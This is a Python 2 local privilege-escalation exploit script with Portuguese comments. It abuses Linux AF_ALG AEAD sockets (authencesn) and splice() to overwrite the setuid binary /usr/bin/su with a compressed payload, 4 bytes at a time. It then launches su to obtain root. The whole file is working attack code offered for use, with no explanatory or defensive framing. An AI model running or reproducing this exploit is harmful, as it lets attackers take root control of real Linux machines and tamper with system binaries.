#!/usr/bin/env python2
import os as o
import zlib
import socket as s
import ctypes
from ctypes import CDLL, c_int, c_ulong, c_size_t, c_void_p, byref, c_longlong, c_char_p, create_string_buffer, addressof, c_uint, c_short, c_ushort, c_ubyte, c_ssize_t, c_void_p, cast, POINTER, Structure, sizeof, memmove, addressof

libc = CDLL("libc.so.6")

def sp(fin, offin, fout, offout, len_, fl=0):
    p = lambda x: byref(c_longlong(x)) if x is not None else None
    return libc.splice(fin, p(offin), fout, p(offout), len_, fl)

def d(x): return x.decode('hex')

# Estruturas para sendmsg
class Iovec(Structure):
    _fields_ = [
        ("iov_base", c_void_p),
        ("iov_len", c_size_t),
    ]

class Msghdr(Structure):
    _fields_ = [
        ("msg_name", c_void_p),
        ("msg_namelen", c_uint),
        ("msg_iov", c_void_p),
        ("msg_iovlen", c_size_t),
        ("msg_control", c_void_p),
        ("msg_controllen", c_size_t),
        ("msg_flags", c_int),
    ]

class Cmsghdr(Structure):
    _fields_ = [
        ("cmsg_len", c_size_t),
        ("cmsg_level", c_int),
        ("cmsg_type", c_int),
    ]

# Constantes
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_AEAD_ASSOCLEN = 5
ALG_SET_AEAD_AUTHSIZE = 4
ALG_OP_ENCRYPT = 3
ALG_OP_DECRYPT = 2

# Macros para CMSG
def CMSG_LEN(data_len):
    return sizeof(Cmsghdr) + data_len

def CMSG_SPACE(data_len):
    # Alinhamento para 8 bytes (tipicamente)
    total = CMSG_LEN(data_len)
    return (total + 7) & ~7

def sendmsg_with_cmsgs(fd, data, cmsgs):
    """
    Envia mensagem com múltiplos CMSGs via sendmsg()
    
    Args:
        fd: file descriptor do socket
        data: string com os dados a enviar
        cmsgs: lista de tuplas (level, type, data_string)
    """
    
    # 1. Prepara o iovec com os dados principais
    data_buf = create_string_buffer(data)
    iov = Iovec()
    iov.iov_base = addressof(data_buf)
    iov.iov_len = len(data)
    
    # 2. Calcula espaço total para todos os CMSGs
    total_cmsg_space = 0
    for level, cmsg_type, cmsg_data in cmsgs:
        total_cmsg_space += CMSG_SPACE(len(cmsg_data))
    
    # 3. Cria buffer para todos os CMSGs concatenados
    cmsg_buffer = create_string_buffer(total_cmsg_space)
    offset = 0
    
    # 4. Preenche cada CMSG no buffer
    for level, cmsg_type, cmsg_data in cmsgs:
        # Tamanho deste CMSG
        cmsg_len = CMSG_LEN(len(cmsg_data))
        
        # Ponteiro para a posição atual no buffer
        cmsg_ptr = cast(addressof(cmsg_buffer) + offset, POINTER(Cmsghdr))
        cmsg_ptr.contents.cmsg_len = cmsg_len
        cmsg_ptr.contents.cmsg_level = level
        cmsg_ptr.contents.cmsg_type = cmsg_type
        
        # Copia os dados do CMSG (imediatamente após o header)
        data_ptr = addressof(cmsg_buffer) + offset + sizeof(Cmsghdr)
        memmove(data_ptr, cmsg_data, len(cmsg_data))
        
        # Avança offset (alinhado)
        offset += CMSG_SPACE(len(cmsg_data))
    
    # 5. Prepara o msghdr
    msghdr = Msghdr()
    msghdr.msg_iov = addressof(iov)
    msghdr.msg_iovlen = 1
    msghdr.msg_control = addressof(cmsg_buffer)
    msghdr.msg_controllen = total_cmsg_space
    msghdr.msg_flags = 0
    
    # 6. Chama sendmsg
    result = libc.sendmsg(fd, byref(msghdr), 0)
    
    if result == -1:
        # Erro, você pode verificar errno aqui
        return -1
    
    return result

def c(fd, off, chunk):
    # Cria socket AF_ALG
    a = s.socket(38, 5, 0)  # AF_ALG (38), SOCK_SEQPACKET (5)
    
    # Bind com o algoritmo
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    
    # Configura chave (ALG_SET_KEY)
    key = d('0800010000000010' + '0'*64)
    a.setsockopt(SOL_ALG, ALG_SET_KEY, key)
    
    # Configura tamanho do dado associado (ALG_SET_AEAD_ASSOCLEN)
    a.setsockopt(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, None, 4)
    
    # Aceita conexão
    u, _ = a.accept()
    
    l = off + 4
    i = d('00')
    
    # Prepara os dados a enviar
    data_to_send = "A"*4 + chunk
    
    # Prepara os múltiplos CMSGs (3 deles)
    # baseado no original:
    # (h, 3, i*4)          - ALG_OP_ENCRYPT com tamanho
    # (h, 2, b'\x10'+i*19) - ALG_OP_DECRYPT com dados
    # (h, 4, b'\x08'+i*3)  - ALG_SET_AEAD_AUTHSIZE com dados
    cmsgs = [
        (SOL_ALG, ALG_OP_ENCRYPT, i * 4),           # ALG_OP_ENCRYPT
        (SOL_ALG, ALG_OP_DECRYPT, '\x10' + i * 19), # ALG_OP_DECRYPT  
        (SOL_ALG, ALG_SET_AEAD_AUTHSIZE, '\x08' + i * 3),  # ALG_SET_AEAD_AUTHSIZE
    ]
    
    # Envia via sendmsg com múltiplos CMSGs
    result = sendmsg_with_cmsgs(u.fileno(), data_to_send, cmsgs)
    
    if result == -1:
        # Se falhar, tenta sem os CMSGs como fallback
        u.send(data_to_send)
    
    # Cria pipes para splice
    r, w = o.pipe()
    
    # Splice do arquivo para o pipe
    sp(fd, 0, w, None, l)
    
    # Splice do pipe para o socket
    sp(r, None, u.fileno(), None, l)
    
    # Tenta receber resposta
    try:
        u.recv(8 + off)
    except:
        pass

# Abre /usr/bin/su
fd = o.open("/usr/bin/su", 0)

# Decompress dos dados
compressed = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
data = zlib.decompress(d(compressed))

# Escreve em blocos de 4 bytes
i = 0
while i < len(data):
    c(fd, i, data[i:i+4])
    i += 4

print "[+] Concluído. Obtendo root..."
o.system("su")
